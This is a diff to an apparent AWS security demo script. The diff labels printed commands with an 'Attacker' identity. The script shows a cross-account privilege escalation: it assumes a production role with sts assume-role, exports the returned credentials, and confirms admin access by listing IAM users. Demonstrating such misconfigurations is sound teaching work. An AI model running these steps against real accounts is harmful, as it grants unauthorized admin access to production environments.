@@ -23,12 +23,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -95,9 +97,9 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 DEV_ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Current identity: $CURRENT_USER"
 echo "Dev Account ID: $DEV_ACCOUNT_ID"
@@ -117,7 +119,7 @@ echo -e "${GREEN}✓ Extracted prod account ID from target role ARN${NC}\n"
 # Step 4: Verify lack of admin access in prod account
 echo -e "${YELLOW}Step 4: Verifying we don't have admin access in prod yet${NC}"
 echo "Attempting to list IAM users in prod account (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -129,7 +131,7 @@ echo ""
 echo -e "${YELLOW}Step 5: Assuming the target role in prod account${NC}"
 echo "Target Role ARN: $TARGET_ROLE_ARN"
 
-show_attack_cmd "aws sts assume-role --role-arn $TARGET_ROLE_ARN --role-session-name cross-account-demo-session --query 'Credentials' --output json"
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn $TARGET_ROLE_ARN --role-session-name cross-account-demo-session --query 'Credentials' --output json"
 CREDENTIALS=$(aws sts assume-role \
     --role-arn $TARGET_ROLE_ARN \
     --role-session-name cross-account-demo-session \
@@ -143,9 +145,9 @@ export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
 export AWS_REGION=$AWS_REGION
 
 # Verify we assumed the role
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 CURRENT_ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Current identity: $ROLE_IDENTITY"
 echo "Current Account ID: $CURRENT_ACCOUNT_ID"
@@ -166,7 +168,7 @@ echo -e "${GREEN}✓ Successfully assumed role in prod account${NC}\n"
 echo -e "${YELLOW}Step 6: Verifying administrator access in prod account${NC}"
 echo "Attempting to list IAM users..."
 
-show_cmd "aws iam list-users --max-items 3 --output table"
+show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED IN PROD ACCOUNT${NC}"
